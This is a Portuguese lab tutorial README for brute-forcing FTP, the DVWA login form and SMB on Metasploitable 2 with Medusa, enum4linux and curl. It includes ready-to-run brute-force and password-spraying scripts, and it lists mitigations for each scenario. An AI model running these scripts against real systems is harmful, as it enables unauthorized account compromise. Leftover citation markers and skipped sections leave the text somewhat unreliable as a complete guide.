# brute-force-lab
Laboratório de ataque Brute Force utilizando Kali Linux, Medusa e Metasploitable 

### **OBJETIVO**

Implementar, documentar e compartilhar um projeto prático utilizando **Kali Linux** e a ferramenta **Medusa**, em conjunto com ambientes vulneráveis (por exemplo, **Metasploitable 2** e **DVWA**), para simular cenários de ataque de força bruta e exercitar medidas de prevenção.

- **Configurar o ambiente**: duas VMs (Kali Linux e Metasploitable 2) no VirtualBox, com rede interna (*host-only*).
- **Executar ataques simulados**: força bruta em **FTP**, automação de tentativas em **formulário web (DVWA)** e **password spraying** em **SMB** com enumeração de usuários.
- **Documentar os testes**: wordlists simples, comandos utilizados, validação de acessos e recomendações de mitigação.


  Abaixo está um roteiro completo, em português, pensado para quem está começando e quer montar, executar, documentar e compartilhar um **laboratório de brute force** de forma **isolada e controlada**, usando **Kali Linux**, **Medusa**, **Metasploitable 2** e **DVWA**. O foco é **aprendizado prático com visão defensiva**, sempre restrito ao seu próprio lab. O **Metasploitable 2** é uma VM intencionalmente vulnerável da Rapid7 e **não deve ser exposto a redes hostis**; o **DVWA** também é deliberadamente vulnerável e os próprios mantenedores alertam para não publicá-lo em servidor exposto à internet. Ela também informa que o DVWA no Metasploitable tem credenciais padrão `admin/password`. :contentReference[oaicite:11]{index=11} Crie as listas: ```bash cat > wordlists/users_ftp.txt << 'EOF' msfadmin user postgres sys service EOF ``` ```bash cat > wordlists/users_smb.txt << 'EOF' msfadmin user postgres sys klog service EOF ``` ```bash cat > wordlists/users_dvwa.txt << 'EOF' admin test user guest EOF ``` ```bash cat > wordlists/passwords.txt << 'EOF' admin password msfadmin user postgres batman 123456789 service EOF ``` Para estudo inicial, listas curtas são melhores porque: - você entende mais facilmente o que está acontecendo - os resultados são reprodutíveis - os logs ficam legíveis --- # 9) Teste 1 — Brute force em FTP com Medusa ## 9.1 Confirmar o serviço FTP No Kali: ```bash nmap -sV -Pn -p 21 192.168.56.101 ``` A Rapid7 mostra que o Metasploitable 2 expõe FTP em **21/tcp** e identifica o serviço como **vsFTPd 2.3.4** no guia de explorabilidade. :contentReference[oaicite:12]{index=12} > Observação importante: o Metasploitable 2 também tem outras vulnerabilidades graves além de senhas fracas. Neste laboratório, o foco é **autenticação fraca**, não explorar backdoors específicos do serviço FTP. :contentReference[oaicite:13]{index=13} --- ## 9.2 Descobrir o módulo correto do Medusa Liste os módulos: ```bash medusa -d ``` Depois veja a ajuda do módulo FTP: ```bash medusa -q -M ftp ``` A ajuda geral do Medusa informa justamente `-d` para listar módulos e `-q` para exibir a ajuda de um módulo específico. :contentReference[oaicite:14]{index=14} --- ## 9.3 Executar o ataque de brute force em FTP Exemplo: ```bash medusa -h 192.168.56.101 \ -U wordlists/users_ftp.txt \ -P wordlists/passwords.txt \ -M ftp \ -f \ -t 2 \ -v 4 \ -O logs/ftp_medusa.log ``` ### O que cada parte faz - `-h`: host alvo - `-U`: arquivo de usuários - `-P`: arquivo de senhas - `-M ftp`: módulo FTP - `-f`: para ao encontrar a primeira credencial válida no host - `-t 2`: baixa concorrência, bom para iniciante - `-v 4`: saída mais detalhada - `-O`: grava o log --- ## 9.4 Como interpretar a saída Procure linhas indicando sucesso, algo como: ```text ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin ``` Salve essa evidência no seu README ou com screenshot do terminal. --- ## 9.5 Validar manualmente o acesso FTP Depois do achado, valide com cliente FTP: ```bash ftp 192.168.56.101 ``` Quando pedir: - usuário: `msfadmin` - senha: `msfadmin` Se entrar, o resultado foi confirmado. ### O que documentar - IP do alvo - comando executado - tempo aproximado - credencial encontrada - validação manual do login - print do terminal --- ## 9.6 Mitigação para o cenário FTP No relatório, escreva algo como: - desabilitar **FTP legado** quando possível e preferir **SFTP/FTPS** - aplicar política de senhas fortes e únicas - limitar tentativas de autenticação - aplicar bloqueio temporário ou rate limit - registrar e monitorar falhas de login - usar listas de bloqueio e ferramentas como fail2ban - remover contas padrão ou fracas --- # 10) Teste 2 — Automação de tentativas em formulário web no DVWA Aqui está a parte que mais confunde iniciantes, então vou deixar o fluxo bem claro. ## 10.1 Entendendo o DVWA no Metasploitable A Rapid7 documenta que o Metasploitable 2 já vem com várias aplicações web vulneráveis em `/var/www`, incluindo **`dvwa`**, e diz que aplicações específicas podem ser acessadas com `http://<IP>/<Application Folder>/`. Ela também lista o **DVWA** e informa as credenciais padrão **`admin` / `password`**. O repositório oficial do DVWA confirma que o objetivo da aplicação é ensino em ambiente legal/controlado e também confirma as credenciais padrão. :contentReference[oaicite:15]{index=15} Acesse: ```text http://192.168.56.101/dvwa/ ``` ou diretamente: ```text http://192.168.56.101/dvwa/login.php ``` Faça login com: - usuário: `admin` - senha: `password` :contentReference[oaicite:16]{index=16} --- ## 10.2 Colocar o DVWA em nível baixo Depois de logar: 1. Vá em **DVWA Security** 2. Selecione **Low** 3. Salve O DVWA oficial documenta a possibilidade de definir o nível padrão de segurança como `low`, e seu propósito é justamente permitir prática controlada de vulnerabilidades web. :contentReference[oaicite:17]{index=17} --- ## 10.3 Escolher a página certa para o teste Para este laboratório, use a página **Brute Force** do próprio DVWA, não a tela principal de login. No menu do DVWA: - clique em **Brute Force** Essa página é melhor para estudo porque foi feita justamente para mostrar falhas de autenticação. --- ## 10.4 Capturar como o formulário funciona Como iniciante, faça assim: 1. Abra a página **Brute Force** 2. Pressione **F12** no navegador 3. Vá para a aba **Network** 4. Tente um login manual qualquer, por exemplo: - usuário: `admin` - senha: `teste` 5. Observe a requisição gerada Você precisa descobrir: - **URL** da requisição - se o método é **GET** ou **POST** - nomes dos parâmetros do formulário - cookies de sessão No DVWA em nível baixo, a lógica costuma ser simples o suficiente para você enxergar claramente os parâmetros do formulário ao capturar a requisição. O mais importante aqui não é decorar um nome de campo, e sim aprender a **identificar** o formato real da requisição antes de automatizar. --- ## 10.5 Capturar o cookie da sessão Como você já entrou no DVWA e colocou a segurança em `Low`, o navegador terá um cookie de sessão. No navegador: 1. F12 2. Application / Storage 3. Cookies 4. Copie o valor de `PHPSESSID` 5. Anote também que a aplicação precisa da condição equivalente a `security=low` Monte algo assim: ```bash COOKIE="PHPSESSID=SEU_VALOR_AQUI; security=low" ``` --- ## 10.6 Descobrir a diferença entre erro e sucesso Antes de automatizar, faça duas tentativas manuais na página **Brute Force**: 1. uma com senha errada 2. outra com senha correta Compare o HTML retornado no navegador ou usando “View Source”. O objetivo é descobrir um **marcador de sucesso** e um **marcador de falha**. Exemplo do que você quer encontrar: - falha: frase parecida com “incorrect” - sucesso: frase específica de área protegida Como a forma exata pode variar, o ideal é você mesmo extrair esse marcador do seu ambiente e usá-lo no script. --- ## 10.7 Automatizar com `curl` e Bash Para iniciantes, esta é a forma mais reprodutível. O Medusa suporta **HTTP** segundo o projeto oficial, mas a sintaxe exata para formulários pode variar conforme módulo/build; por isso, para o **formulário do DVWA**, usar `curl` após capturar a requisição costuma ser mais didático e mais fácil de depurar. O próprio Medusa recomenda usar `-d` e `-q -M <módulo>` para conferir os módulos disponíveis e sua sintaxe local. :contentReference[oaicite:18]{index=18} Crie o script: ```bash cat > dvwa_bruteforce.sh << 'EOF' #!/usr/bin/env bash TARGET="192.168.56.101" URL="http://${TARGET}/dvwa/vulnerabilities/brute/" COOKIE="PHPSESSID=COLE_AQUI_O_SEU_COOKIE; security=low" USERS_FILE="wordlists/users_dvwa.txt" PASSWORDS_FILE="wordlists/passwords.txt" # Ajuste este texto para algo que só apareça em sucesso no seu ambiente SUCCESS_MARKER="Welcome" echo "[*] Iniciando automação no DVWA..." echo "[*] URL: ${URL}" while IFS= read -r user; do while IFS= read -r pass; do echo "[*] Testando ${user}:${pass}" RESPONSE=$(curl -s -G "${URL}" \ --cookie "${COOKIE}" \ --data-urlencode "username=${user}" \ --data-urlencode "password=${pass}" \ --data-urlencode "Login=Login") if echo "${RESPONSE}" | grep -q "${SUCCESS_MARKER}"; then echo "[+] CREDENCIAL ENCONTRADA -> ${user}:${pass}" exit 0 fi done < "${PASSWORDS_FILE}" done < "${USERS_FILE}" echo "[-] Nenhuma credencial encontrada com as wordlists atuais." EOF ``` Dê permissão e execute: ```bash chmod +x dvwa_bruteforce.sh ./dvwa_bruteforce.sh | tee logs/dvwa_bruteforce.log ``` --- ## 10.8 Como ajustar o script se não funcionar de primeira Esse é o ponto mais importante para quem está começando. Verifique, na ordem: 1. **URL correta** - confirme se a página é mesmo `/dvwa/vulnerabilities/brute/` 2. **Método correto** - se a aba Network mostrar `POST`, o script precisa mudar de `-G` para `-d` 3. **Nomes dos campos** - confirme se os campos realmente se chamam `username`, `password`, `Login` 4. **Cookie correto** - `PHPSESSID` precisa estar válido - `security=low` precisa existir 5. **Marcador de sucesso** - ajuste `SUCCESS_MARKER` para algo que realmente apareça apenas quando a autenticação dá certo --- ## 10.9 Validar manualmente o acesso encontrado Se o script retornar algo como: ```text [+] CREDENCIAL ENCONTRADA -> admin:password ``` volte ao navegador e confirme manualmente no DVWA. A Rapid7 e o DVWA oficial indicam exatamente essas credenciais padrão para o ambiente. :contentReference[oaicite:19]{index=19} --- ## 10.10 Mitigação para o cenário web No relatório, destaque: - **rate limiting** por IP/usuário - **bloqueio temporário** após falhas - **MFA** - **CAPTCHA** em cenários adequados - mensagens de erro genéricas - monitoramento e alerta de tentativas repetidas - proteção contra enumeração de usuários - política de senha forte - revisão de sessões e cookies - proteção CSRF onde fizer sentido --- # 11) Teste 3 — Enumeração de usuários e password spraying em SMB ## 11.1 Entendendo o alvo SMB A Rapid7 mostra que o Metasploitable 2 expõe SMB em **139** e **445**, usa **Samba 3.0.20**, permite em alguns casos enumeração/compartilhamentos anônimos, e afirma explicitamente que o sistema tem senhas fracas, inclusive citando contas como `msfadmin`, `user`, `postgres`, `sys`, `klog` e `service`. :contentReference[oaicite:20]{index=20} --- ## 11.2 Enumerar usuários e informações com enum4linux A documentação do Kali mostra que o `enum4linux` serve para enumerar informações de Windows/Samba e dá exemplo com `-U` para obter **lista de usuários** e `-o` para **informações do sistema operacional**. Ela também documenta opções úteis como `-S` para shares, `-G` para grupos e `-a` para enumeração simples geral. :contentReference[oaicite:21]{index=21} Comece assim: ```bash enum4linux -U -o 192.168.56.101 | tee logs/enum4linux_users.log ``` Depois, uma enumeração mais ampla: ```bash enum4linux -a 192.168.56.101 | tee logs/enum4linux_all.log ``` Se quiser olhar shares: ```bash enum4linux -S 192.168.56.101 ``` Você também pode testar listagem anônima com: ```bash smbclient -L //192.168.56.101 -N ``` A Rapid7 mostra exatamente um caso de login SMB anônimo bem-sucedido no Metasploitable 2 e lista shares como `tmp`, `opt`, `IPC$` e `ADMIN$`. :contentReference[oaicite:22]{index=22} --- ## 11.3 Montar a lista final de usuários Depois da enumeração, refine `wordlists/users_smb.txt` com os usuários encontrados. Exemplo: ```bash cat > wordlists/users_smb.txt << 'EOF' msfadmin user postgres sys klog service EOF ``` --- ## 11.4 Entender o password spraying **Brute force clássico**: - muitas senhas para um único usuário **Password spraying**: - uma única senha comum contra vários usuários - depois troca para outra senha comum Isso é importante porque, no mundo real, spraying costuma ser menos barulhento do que testar dezenas de senhas num só usuário. No seu relatório, vale explicar essa diferença. --- ## 11.5 Descobrir o módulo SMB do Medusa O projeto oficial do Medusa traz um módulo **`smbnt`**. No código-fonte oficial, a ajuda do módulo mostra exemplos como: ```text medusa -M smbnt -h somehost -u someuser -p somepassword medusa -M smbnt -h somehost -U users.txt -p password -m GROUP:DOMAIN ``` A mesma ajuda explica que o módulo trabalha sobre **139 ou 445/tcp** e que o comportamento padrão é tentar **445/tcp** primeiro. Ela também explica como interpretar sucesso com `ADMIN$` permitido ou negado. :contentReference[oaicite:23]{index=23} Confirme localmente: ```bash medusa -d | grep -i smb medusa -q -M smbnt ``` --- ## 11.6 Executar password spraying com Medusa A lógica será: - pegar uma senha comum - testar em todos os usuários - depois trocar a senha Crie um script simples: ```bash cat > smb_spray.sh << 'EOF' #!/usr/bin/env bash TARGET="192.168.56.101" USERS_FILE="wordlists/users_smb.txt" PASSWORDS=( "msfadmin" "user" "postgres" "batman" "123456789" "service" ) for pwd in "${PASSWORDS[@]}"; do echo echo "[*] Spraying senha: ${pwd}" medusa -h "${TARGET}" \ -U "${USERS_FILE}" \ -p "${pwd}" \ -M smbnt \ -t 2 \ -v 4 \ -O "logs/smb_spray_${pwd}.log" done EOF ``` Execute: ```bash chmod +x smb_spray.sh ./smb_spray.sh ``` --- ## 11.7 Interpretar a saída do módulo SMB A ajuda oficial do `smbnt` diz que o módulo faz autenticação SMB e tentativa de acesso ao share administrativo `ADMIN$`, e interpreta assim: - **credencial administrativa válida**: sucesso com acesso permitido ao `ADMIN$` - **credencial de usuário válida**: sucesso com acesso negado ao `ADMIN$` - **credencial válida, nível indefinido**: share indisponível, mas autenticação válida :contentReference[oaicite:24]{index=24} Ou seja: mesmo que o `ADMIN$` seja negado, a credencial ainda pode ser **válida**. --- ## 11.8 Validar a credencial encontrada Se aparecer algo como: ```text ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: user Password: user ``` valide com: ```bash smbclient -L //192.168.56.101 -U user ``` Digite a senha encontrada quando solicitado. --- ## 11.9 Se o módulo pedir domínio ou grupo A ajuda oficial do `smbnt` mostra parâmetros como: - `GROUP` - `GROUP_OTHER` - `PASS` - `AUTH` - `MODE` e exemplos com: ```bash -m GROUP:DOMAIN ``` Se o seu ambiente exigir, confira a ajuda do módulo com `medusa -q -M smbnt` e ajuste. Em ambientes Samba simples de laboratório, muitas vezes o teste local já funciona sem isso. :contentReference[oaicite:25]{index=25} --- ## 11.10 Mitigação para o cenário SMB No relatório, inclua: - desabilitar enumeração anônima - restringir guest/anonymous access - senhas fortes e únicas - bloqueio inteligente contra spraying - monitoramento de falhas de autenticação - revisão de compartilhamentos expostos - política de menor privilégio - rotação de credenciais - MFA onde aplicável - remoção de contas fracas/padrão --- # 12) Comandos de validação úteis ## 12.1 Descoberta inicial ```bash nmap -sV -Pn -p 21,80,139,445 192.168.56.101 ``` ## 12.2 Medusa: ajuda geral ```bash medusa -h medusa -d medusa -q -M ftp medusa -q -M smbnt ``` ## 12.3 FTP ```bash medusa -h 192.168.56.101 -U wordlists/users_ftp.txt -P wordlists/passwords.txt -M ftp -f -t 2 -v 4 ftp 192.168.56.101 ``` ## 12.4 DVWA ```bash xdg-open http://192.168.56.101/dvwa/ ./dvwa_bruteforce.sh ``` ## 12.5 SMB ```bash enum4linux -U -o 192.168.56.101 smbclient -L //192.168.56.101 -N ./smb_spray.sh smbclient -L //192.168.56.101 -U msfadmin ``` --- # 13) O que documentar no projeto Para ficar forte como portfólio, documente sempre o mesmo padrão: ## 13.1 Ambiente -
